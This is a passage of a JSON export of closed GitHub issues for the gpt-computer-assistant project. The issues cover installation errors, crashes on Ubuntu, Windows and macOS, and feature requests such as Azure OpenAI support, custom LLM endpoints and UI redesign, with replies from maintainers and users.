pywin32\r\nWARNING: pip is being invoked by an old script wrapper. This will fail in a future version of pip.\r\nPlease see https://github.com/pypa/pip/issues/5599 for advice on fixing the underlying issue.\r\nTo avoid this problem you can invoke Python with '-m pip' instead of running pip directly.\r\nRequirement already satisfied: duckduckgo-search==5.3.0 in /usr/local/lib/python3.10/dist-packages (5.3.0)\r\nRequirement already satisfied: click>=8.1.7 in /usr/local/lib/python3.10/dist-packages (from duckduckgo-search==5.3.0) (8.1.7)\r\nRequirement already satisfied: orjson>=3.10.0 in /usr/local/lib/python3.10/dist-packages (from duckduckgo-search==5.3.0) (3.10.3)\r\nRequirement already satisfied: curl-cffi>=0.6.2 in /usr/local/lib/python3.10/dist-packages (from duckduckgo-search==5.3.0) (0.6.4)\r\nRequirement already satisfied: cffi>=1.12.0 in ./.local/lib/python3.10/site-packages (from curl-cffi>=0.6.2->duckduckgo-search==5.3.0) (1.16.0)\r\nRequirement already satisfied: certifi>=2024.2.2 in ./.local/lib/python3.10/site-packages (from curl-cffi>=0.6.2->duckduckgo-search==5.3.0) (2024.2.2)\r\nRequirement already satisfied: pycparser in ./.local/lib/python3.10/site-packages (from cffi>=1.12.0->curl-cffi>=0.6.2->duckduckgo-search==5.3.0) (2.22)\r\nProfile: None\r\npygame 2.5.2 (SDL 2.28.2, Python 3.10.12)\r\nHello from the pygame community. https://www.pygame.org/contribute.html\r\nImported all libraries\r\nQWidget::setLayout: Attempting to set QLayout \"\" on MainWindow \"\", which already has a layout\r\nRecording started...\r\nState updated: talking\r\nRecording stopped\r\nAudio saved as voice_input.wav\r\nON RECORDING STOPPED\r\nState updated: thinking\r\nState updated: thinking\r\nHTTP Request: POST https://api.openai.com/v1/audio/transcriptions \"HTTP/1.1 200 OK\"\r\nHISTORY DB /home/lebaron/.local/lib/python3.10/site-packages/gpt_computer_assistant/utils/artifacts/history_default.db\r\nLLM INPUT USER: How are you today?\r\nHISTORY DB /home/lebaron/.local/lib/python3.10/site-packages/gpt_computer_assistant/utils/artifacts/history_default.db\r\nHTTP Request: POST https://api.openai.com/v1/chat/completions \"HTTP/1.1 200 OK\"\r\nHISTORY DB /home/lebaron/.local/lib/python3.10/site-packages/gpt_computer_assistant/utils/artifacts/history_default.db\r\nTHE LAST MESSAGES I'm functioning perfectly, thank you! How can I help you today?\r\nHTTP Request: POST https://api.openai.com/v1/audio/speech \"HTTP/1.1 200 OK\"\r\nState updated: talking\r\nState updated: idle\r\n[1]    1427530 segmentation fault (core dumped)  computerassistant\r\n```\r\n\r\nOS information :\r\n\r\n```\r\n~ lsb_release -a\r\nNo LSB modules are available.\r\nDistributor ID: Ubuntu\r\nDescription:    Ubuntu 22.04.4 LTS\r\nRelease:        22.04\r\nCodename:       jammy\r\n```\r\n\r\nPython information : \r\n\r\n```\r\n~ python3 --version\r\nPython 3.10.12\r\n```\r\n\r\nOpenassistant version :\r\n\r\n```\r\n~ pip3 show gpt-computer-assistant\r\nName: gpt-computer-assistant\r\nVersion: 0.8.9\r\nSummary: GPT\r\n```\r\n\r\nThanks for the great project ! :smile: ",
+      "state": "closed",
+      "author": "LeBaronDeCharlus",
+      "author_type": "User",
+      "created_at": "2024-06-07T08:06:50Z",
+      "updated_at": "2024-12-11T22:04:00Z",
+      "closed_at": "2024-12-11T22:03:59Z",
+      "labels": [
+        "bug",
+        "ubuntu"
+      ],
+      "label_count": 2,
+      "has_labels": true,
+      "comments_count": 1,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/76/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/76",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/76",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:55.413201",
+      "comments": [
+        {
+          "author": "Bartupso",
+          "body": "Sorry for the late reply. We will have a new version soon",
+          "created_at": "2024-12-11T22:04:00Z"
+        }
+      ]
+    },
+    {
+      "issue_number": 74,
+      "title": "Adding Azure Open AI ",
+      "body": "Please add azure open ai to this",
+      "state": "closed",
+      "author": "abhishek462307",
+      "author_type": "User",
+      "created_at": "2024-06-07T07:54:55Z",
+      "updated_at": "2024-12-11T22:01:00Z",
+      "closed_at": "2024-12-11T22:01:00Z",
+      "labels": [
+        "improvement",
+        "new_model"
+      ],
+      "label_count": 2,
+      "has_labels": true,
+      "comments_count": 4,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/74/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/74",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/74",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:55.620068",
+      "comments": [
+        {
+          "author": "Mideky-hub",
+          "body": "Sure, working on it\r\n",
+          "created_at": "2024-06-07T14:07:54Z"
+        },
+        {
+          "author": "yidasanqian",
+          "body": "> Sure, working on it\r\n\r\n@Mideky-hub @onuratakan How long is left to support?",
+          "created_at": "2024-07-17T06:37:05Z"
+        },
+        {
+          "author": "adminsde",
+          "body": "Hi. ss now azure openai available on the gpt assistant?",
+          "created_at": "2024-11-13T02:00:21Z"
+        },
+        {
+          "author": "Bartupso",
+          "body": "Sorry for the late reply. Yes, support to azure open AI. We will have a new version soon. ",
+          "created_at": "2024-12-11T22:01:00Z"
+        }
+      ]
+    },
+    {
+      "issue_number": 34,
+      "title": " ole32 Windows",
+      "body": "when launching computerassistant the error occurs and I have no idea why, I have ole32.dll in my C:\\Windows\\System32 folder. \r\nOSError: ctypes.util.find_library() did not manage to locate a library called 'ole32'\r\n",
+      "state": "closed",
+      "author": "Andrecks",
+      "author_type": "User",
+      "created_at": "2024-06-05T12:46:38Z",
+      "updated_at": "2024-12-11T22:00:16Z",
+      "closed_at": "2024-12-11T22:00:15Z",
+      "labels": [
+        "windows"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 3,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/34/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/34",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/34",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:55.805218",
+      "comments": [
+        {
+          "author": "Mideky-hub",
+          "body": "@Andrecks | Did you tried to do :\r\n- Win + R\r\n- cmd then Ctrl+Maj+Enter\r\n- Enter again\r\n- type \"sfc /scannow\" to scan your system for missing or corrupted packages\r\n\r\nTell me if this worked for you.",
+          "created_at": "2024-06-10T10:22:12Z"
+        },
+        {
+          "author": "dirkarnez",
+          "body": "@Andrecks did you have the solution? I just have same error but mine is just because my `%PATH%` is empty. ",
+          "created_at": "2024-12-08T19:19:14Z"
+        },
+        {
+          "author": "Bartupso",
+          "body": "Sorry for the late reply. We will have a new version soon",
+          "created_at": "2024-12-11T22:00:15Z"
+        }
+      ]
+    },
+    {
+      "issue_number": 9,
+      "title": "Can this work with the Assistant API?",
+      "body": null,
+      "state": "closed",
+      "author": "GrushBrush",
+      "author_type": "User",
+      "created_at": "2024-05-31T10:44:36Z",
+      "updated_at": "2024-12-11T21:52:03Z",
+      "closed_at": "2024-12-11T21:52:03Z",
+      "labels": [
+        "improvement"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 2,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/9/reactions",
+        "total_count": 1,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 1,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/9",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/9",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:56.055778",
+      "comments": [
+        {
+          "author": "onuratakan",
+          "body": "Hi actualy its logical and i want to add. I will add to roadmap and looking for.",
+          "created_at": "2024-06-01T22:28:02Z"
+        },
+        {
+          "author": "codermaker2022",
+          "body": "openai.AuthenticationError: Error code: 401 - {'error': {'message': 'Inpackages\\openai\\_base_client.py\", line 1020, in _requestcorrect API key provided: CHANGE_ME. You can find your API key at https://platform.openai.com/account/api-keys.', 'type': 'invalid_request_errcorrect API key provided: CHANG",
+          "created_at": "2024-06-06T20:48:20Z"
+        }
+      ]
+    },
+    {
+      "issue_number": 10,
+      "title": "Not working with Mac OS",
+      "body": null,
+      "state": "closed",
+      "author": "kellyzxiaowei",
+      "author_type": "User",
+      "created_at": "2024-06-02T10:16:18Z",
+      "updated_at": "2024-12-11T21:51:46Z",
+      "closed_at": "2024-12-11T21:51:46Z",
+      "labels": [
+        "bug",
+        "macos"
+      ],
+      "label_count": 2,
+      "has_labels": true,
+      "comments_count": 9,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/10/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/10",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/10",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:56.291319",
+      "comments": [
+        {
+          "author": "onuratakan",
+          "body": "Hi, can you share a screen shot. Actualy i know there is some problems caused by pyqt5 but it can be fixed.",
+          "created_at": "2024-06-02T12:00:32Z"
+        },
+        {
+          "author": "kellyzxiaowei",
+          "body": "<img width=\"888\" alt=\"image\" src=\"https://github.com/onuratakan/gpt-computer-assistant/assets/129767595/eb1a9c73-8941-40d9-ba14-f550700dfbd0\">\r\n",
+          "created_at": "2024-06-02T13:07:13Z"
+        },
+        {
+          "author": "onuratakan",
+          "body": "@kellyzxiaowei I just made fix. Can you try again.",
+          "created_at": "2024-06-02T14:26:13Z"
+        },
+        {
+          "author": "kellyzxiaowei",
+          "body": "> @kellyzxiaowei I just made fix. Can you try again.\r\n\r\n(venv) zxw@VdeMacBook-Pro gpt-computer-assistant % computerassistant\r\nProfile: None\r\n[02:14:06] Upsonic active                                                                      on_prem.py:130\r\nError: Remote is down\r\nTraceback (most recent ca",
+          "created_at": "2024-06-02T18:17:41Z"
+        },
+        {
+          "author": "onuratakan",
+          "body": "Hi are you working with intel macos?",
+          "created_at": "2024-06-03T19:46:36Z"
+        }
+      ]
+    },
+    {
+      "issue_number": 11,
+      "title": "Error on each click",
+      "body": "On each click on different parts error occurs. Why is that?",
+      "state": "closed",
+      "author": "parsabe",
+      "author_type": "User",
+      "created_at": "2024-06-02T16:06:13Z",
+      "updated_at": "2024-12-11T21:51:32Z",
+      "closed_at": "2024-12-11T21:51:32Z",
+      "labels": [
+        "bug"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 4,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/11/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/11",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/11",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:56.496424",
+      "comments": [
+        {
+          "author": "onuratakan",
+          "body": "Ouu, can i see?",
+          "created_at": "2024-06-02T16:09:48Z"
+        },
+        {
+          "author": "anekant7",
+          "body": "3. Add - confirm for approval flow - FE \r\n\r\n\r\nShubham \r\n6. Create certificate - Status - BE & FE - backend pendnig\r\n\r\n\r\nTanmay\r\n7. Cerate certificate - change history - FE - Populate fields - Can close after populating date time picker \r\n8. Create certificate - handover & handbook section - FE - Can",
+          "created_at": "2024-06-03T16:35:20Z"
+        },
+        {
+          "author": "fatsopanda",
+          "body": "can others contribute to this project @onuratakan ",
+          "created_at": "2024-06-03T21:41:02Z"
+        },
+        {
+          "author": "onuratakan",
+          "body": "> can others contribute to this project @onuratakan\r\n\r\nyeah sure, it will be so amazing",
+          "created_at": "2024-06-03T22:28:12Z"
+        }
+      ]
+    },
+    {
+      "issue_number": 24,
+      "title": "Adding custom llm generation ability",
+      "body": "I wanted to suggest you the possibility to customize the endpoint.\r\n\r\nThis allows the use of services compatible with OpenAI such as:\r\n\r\nhttps://openrouter.ai\r\nhttps://fireworks.ai\r\nhttps://www.together.ai\r\n\r\nThe advantage of OpenRouter is that they also offer free endpoints.\r\n\r\nThank you for the help.",
+      "state": "closed",
+      "author": "comeback01",
+      "author_type": "User",
+      "created_at": "2024-06-04T17:12:47Z",
+      "updated_at": "2024-12-11T21:45:11Z",
+      "closed_at": "2024-12-11T21:45:11Z",
+      "labels": [
+        "improvement"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 3,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/24/reactions",
+        "total_count": 1,
+        "+1": 1,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/24",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/24",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:56.725909",
+      "comments": [
+        {
+          "author": "Zhwt",
+          "body": "If base url is configurable, I think local LLMs(Ollama, etc...) will be supported automatically through [BerriAI/litellm](https://github.com/BerriAI/litellm) proxy.",
+          "created_at": "2024-06-04T17:19:50Z"
+        },
+        {
+          "author": "onuratakan",
+          "body": "Oh yeah, we can but what about vision capabilities, the services that you suggested have vision mode. Should we separate the vision mechanism.",
+          "created_at": "2024-06-04T17:59:51Z"
+        },
+        {
+          "author": "onuratakan",
+          "body": "I will add a support to set custom langchain llm class. With this we can be integrated many models above langchain.",
+          "created_at": "2024-06-05T06:05:34Z"
+        }
+      ]
+    },
+    {
+      "issue_number": 44,
+      "title": "Suggestions for new UI design.",
+      "body": "Using `PyQT webkit` or something like that to render the UI using Chromium engine and styling it using Html/CSS seems a pretty good idea to me. It allows for a better UI design and UX.\r\n\r\nAlso, personally I think the UI is very mobile-like. I mean it doesn't look like a desktop application. It would be cool if you expanded the screen size by a lot and then utilizing all the empty spaces properly with an intuitive design.\r\n\r\nAlso I just discovered this repo and I'm going to look into it, so maybe I'll create a PR for the same. Cool project though.\r\n\r\nAlso I think calling this project something like GPA (GPT Assistant) is kinda cool since GPA matches with GTA and GPT both. But yeah anyways cool project, appreciate the work.",
+      "state": "closed",
+      "author": "SrijanSriv211",
+      "author_type": "User",
+      "created_at": "2024-06-05T20:16:55Z",
+      "updated_at": "2024-12-11T21:45:00Z",
+      "closed_at": "2024-12-11T21:45:00Z",
+      "labels": [
+        "help wanted",
+        "gui"
+      ],
+      "label_count": 2,
+      "has_labels": true,
+      "comments_count": 17,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/44/reactions",
+        "total_count": 1,
+        "+1": 1,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/44",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/44",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:56.937556",
+      "comments": [
+        {
+          "author": "septatrix",
+          "body": "QT Webkit is pretty heavy on resources compared to just QT. It is also possible to style QT with stylesheets. Furthermore would this prevent closer and cooler integration in the future. For example, frameless windows with non-rectangular shapes. A long time ago (before GPT et al took off) I made suc",
+          "created_at": "2024-06-06T12:26:52Z"
+        },
+        {
+          "author": "SrijanSriv211",
+          "body": "It's a good point. Actually just today I came across a new library [DearPyGUI](https://github.com/hoffstadt/DearPyGui) which is similar to [Dear ImGui](https://github.com/ocornut/imgui) but for python. Perhaps one could use it. I haven't explored that module properly yet since I discovered it today ",
+          "created_at": "2024-06-07T09:39:23Z"
+        },
+        {
+          "author": "septatrix",
+          "body": "> ...I don't really know if it is a good candidate for better UI in this project...\r\n\r\nI am not sure I understand why you want to replace the toolkit? QT is very mature and capable.\r\n\r\n> But I still think the UI is very mobile-like. Either making the UI like a proper desktop application or like how ",
+          "created_at": "2024-06-07T10:59:03Z"
+        },
+        {
+          "author": "SrijanSriv211",
+          "body": "> I am not sure I understand why you want to replace the toolkit? QT is very mature and capable.\r\n\r\nNo actually I was just telling that today I discovered a new UI module in Python. It felt interesting to me and it has very intuitive design just like Dear ImGui for C++ so MAYBE it could POTENTIALLY ",
+          "created_at": "2024-06-07T14:26:11Z"
+        },
+        {
+          "author": "onuratakan",
+          "body": "Thanks for this amazing conversation. For now we will continue with qt5 but we will improve ux for feeling better.",
+          "created_at": "2024-06-09T00:50:55Z"
+        }
+      ]
+    },
+    {
+      "issue_number": 99,
+      "title": "Add comments to important functions",
+      "body": "Extract and add code comments to important functions. Try to understand the code parts and what is their purpose also their connections and other things. After that just add small comments. Some times if you want you can add multiple commands in one part via ```",
+      "state": "closed",
+      "author": "onuratakan",
+      "author_type": "User",
+      "created_at": "2024-06-09T00:45:18Z",
+      "updated_at": "2024-12-11T21:42:46Z",
+      "closed_at": "2024-12-11T21:42:46Z",
+      "labels": [
+        "help wanted"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 0,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/99/reactions",
+        "total_count": 1,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 1
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/99",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/99",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:57.191015",
+      "comments": []
+    },
+    {
+      "issue_number": 107,
+      "title": "Fully localized suggestion",
+      "body": "I believe this project has huge potential to have  an option to be fully local and private. For example adding LM Studio integration to allow any downloaded LLM or VLM like Phi-3 Vision. And integrating xVASynth or XTTS(Local TTS).",
+      "state": "closed",
+      "author": "AINXTGENStudio",
+      "author_type": "User",
+      "created_at": "2024-06-09T18:16:38Z",
+      "updated_at": "2024-12-11T21:41:44Z",
+      "closed_at": "2024-12-11T21:41:44Z",
+      "labels": [
+        "improvement"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 2,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/107/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/107",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/107",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:57.191034",
+      "comments": [
+        {
+          "author": "onuratakan",
+          "body": "Hi thank you so much <3, Actualy there is an Ollama integration for now. But yeah maybe LM studio can be good also.",
+          "created_at": "2024-06-14T20:15:35Z"
+        },
+        {
+          "author": "AINXTGENStudio",
+          "body": "Thanks for the consideration as most of these UIs are actually using llama.cpp just like ollama. LM Studio's UI though is very user friendly and has access to huggingface URL for any gguf model and quant variants, LM also has a local server feature that your project could connect to, for example the",
+          "created_at": "2024-06-16T17:27:11Z"
+        }
+      ]
+    },
+    {
+      "issue_number": 116,
+      "title": "TypeError: ForwardRef._evaluate() missing 1 required keyword-only argument: 'recursive_guard'   ",
+      "body": "Hi, I am using python 3.12.4. After installing the gpt computer assistant in command, I failed to run it in command, it shows below codes:\r\n\r\nC:\\Users\\90471>computerassistant\r\nTraceback (most recent call last):\r\n  File \"<frozen runpy>\", line 198, in _run_module_as_main\r\n  File \"<frozen runpy>\", line 88, in _run_code\r\n  File \"D:\\Program Files\\PYTHON\\Scripts\\computerassistant.exe\\__main__.py\", line 4, in <module>\r\n  File \"D:\\Program Files\\PYTHON\\Lib\\site-packages\\gpt_computer_assistant\\__init__.py\", line 5, in <module>\r\n    from .tooler import Tool\r\n  File \"D:\\Program Files\\PYTHON\\Lib\\site-packages\\gpt_computer_assistant\\tooler.py\", line 1, in <module>\r\n    from langchain.tools import tool\r\n  File \"D:\\Program Files\\PYTHON\\Lib\\site-packages\\langchain\\tools\\__init__.py\", line 23, in <module>\r\n    from langchain_core.tools import BaseTool, StructuredTool, Tool, tool\r\n  File \"D:\\Program Files\\PYTHON\\Lib\\site-packages\\langchain_core\\tools.py\", line 34, in <module>\r\n    from langchain_core.callbacks import (\r\n  File \"D:\\Program Files\\PYTHON\\Lib\\site-packages\\langchain_core\\callbacks\\__init__.py\", line 22, in <module>\r\n    from langchain_core.callbacks.manager import (\r\n  File \"D:\\Program Files\\PYTHON\\Lib\\site-packages\\langchain_core\\callbacks\\manager.py\", line 29, in <module>\r\n    from langsmith.run_helpers import get_run_tree_context\r\n  File \"D:\\Program Files\\PYTHON\\Lib\\site-packages\\langsmith\\run_helpers.py\", line 40, in <module>\r\n    from langsmith import client as ls_client\r\n  File \"D:\\Program Files\\PYTHON\\Lib\\site-packages\\langsmith\\client.py\", line 52, in <module>\r\n    from langsmith import env as ls_env\r\n  File \"D:\\Program Files\\PYTHON\\Lib\\site-packages\\langsmith\\env\\__init__.py\", line 3, in <module>\r\n    from langsmith.env._runtime_env import (\r\n  File \"D:\\Program Files\\PYTHON\\Lib\\site-packages\\langsmith\\env\\_runtime_env.py\", line 10, in <module>\r\n    from langsmith.utils import get_docker_compose_command\r\n  File \"D:\\Program Files\\PYTHON\\Lib\\site-packages\\langsmith\\utils.py\", line 31, in <module>\r\n    from langsmith import schemas as ls_schemas\r\n  File \"D:\\Program Files\\PYTHON\\Lib\\site-packages\\langsmith\\schemas.py\", line 69, in <module>\r\n    class Example(ExampleBase):\r\n  File \"D:\\Program Files\\PYTHON\\Lib\\site-packages\\pydantic\\v1\\main.py\", line 286, in __new__\r\n    cls.__try_update_forward_refs__()\r\n  **File \"D:\\Program Files\\PYTHON\\Lib\\site-packages\\pydantic\\v1\\main.py\", line 807, in __try_update_forward_refs__\r\n    update_model_forward_refs(cls, cls.__fields__.values(), cls.__config__.json_encoders, localns, (**NameError,))****\r\n  File \"D:\\Program Files\\PYTHON\\Lib\\site-packages\\pydantic\\v1\\typing.py\", line 554, in update_model_forward_refs\r\n    update_field_forward_refs(f, globalns=globalns, localns=localns)\r\n  File \"D:\\Program Files\\PYTHON\\Lib\\site-packages\\pydantic\\v1\\typing.py\", line 520, in update_field_forward_refs\r\n    field.type_ = evaluate_forwardref(field.type_, globalns, localns or None)\r\n                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\r\n  File \"D:\\Program Files\\PYTHON\\Lib\\site-packages\\pydantic\\v1\\typing.py\", line 66, in evaluate_forwardref\r\n    return cast(Any, type_)._evaluate(globalns, localns, set())\r\n           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\r\n**TypeError: ForwardRef._evaluate() missing 1 required keyword-only argument: 'recursive_guard'**\r\n\r\n I'm not good at coding. Can anyone help? Thanks.\r\n",
+      "state": "closed",
+      "author": "Liya020",
+      "author_type": "User",
+      "created_at": "2024-06-11T03:09:51Z",
+      "updated_at": "2024-12-11T21:41:31Z",
+      "closed_at": "2024-12-11T21:41:31Z",
+      "labels": [
+        "bug"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 9,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/116/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/116",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/116",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:57.404695",
+      "comments": [
+        {
+          "author": "Liya020",
+          "body": "> ```\r\n> pip3 install gpt-computer-assistant\r\n> ```\r\n> \r\n> Did you run the above command prior to running `computerassistant` ?\r\n\r\nYes, I did. It downloaded a lot of files, and looks like the installation succeeded. Then I try to run it and failed.",
+          "created_at": "2024-06-11T04:11:28Z"
+        },
+        {
+          "author": "Mideky-hub",
+          "body": "What if you :\r\n- Go to the root directory\r\n- type in the cmd \"pip3 install -r requirements.txt\"",
+          "created_at": "2024-06-11T13:34:14Z"
+        },
+        {
+          "author": "erquier",
+          "body": "Im having the same issue I even tryed to run the: \"pip3 install -r requirements.txt\"",
+          "created_at": "2024-06-11T15:33:52Z"
+        },
+        {
+          "author": "staneychan",
+          "body": "I have the same problem with python 3.12.4\r\nAnd it works fine after replaced with python 3.12.3",
+          "created_at": "2024-06-12T05:58:26Z"
+        },
+        {
+          "author": "Mideky-hub",
+          "body": "@erquier Try then reverting the Python version as @staneychan and if this still doesn't work : \r\n- pipx install cookiecutter\r\n- pipx runpip cookicutter install -r requirements.txt",
+          "created_at": "2024-06-12T08:38:43Z"
+        }
+      ]
+    },
+    {
+      "issue_number": 125,
+      "title": "MacOS Sonoma 14.5 Screen Recording Permissions?",
+      "body": "Hey @onuratakan. I'm trying to run it but it seems like no matter what I do, GPT assistant is unable to see the contents of my screen. I got a feeling that this has to do with the fact that I need to give permissions to the application to do screenshots/screen recordings, however, I'm not sure what is the \"application\" nam that I should be giving permissions to on my Mac.\r\n\r\nI already have the following, but what should I be adding so that GPT Computer Assistant is able to \"see\"?\r\n<img width=\"486\" alt=\"image\" src=\"https://github.com/onuratakan/gpt-computer-assistant/assets/44922675/96d60d6a-1243-4263-82ae-a1eb3328e8a5\">\r\n",
+      "state": "closed",
+      "author": "felixlu07",
+      "author_type": "User",
+      "created_at": "2024-06-12T01:38:21Z",
+      "updated_at": "2024-12-11T21:40:05Z",
+      "closed_at": "2024-12-11T21:40:05Z",
+      "labels": [
+        "macos"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 3,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/125/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/125",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/125",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:57.628645",
+      "comments": [
+        {
+          "author": "onuratakan",
+          "body": "Oh, thank you for this information. Actualy there is some bugs like this. Can you provide more information?.\r\n\r\nMacbook  type\r\npython version",
+          "created_at": "2024-06-14T20:14:23Z"
+        },
+        {
+          "author": "felixlu07",
+          "body": "I'm running Macbook Pro 14-inch 2023, Running Apple M2 Pro chip, OS-Sonoma 14.5 (23F79)\r\nAs for Python, I'm using Python 3.11 at the moment.",
+          "created_at": "2024-06-16T07:16:06Z"
+        },
+        {
+          "author": "Bartupso",
+          "body": "I suggest Python 3.10 version. We publish new version soon",
+          "created_at": "2024-12-11T21:40:05Z"
+        }
+      ]
+    },
+    {
+      "issue_number": 129,
+      "title": "Gemini KeyError: 'type' Updating from thread EXCEPTION: 'type' State updated: idle",
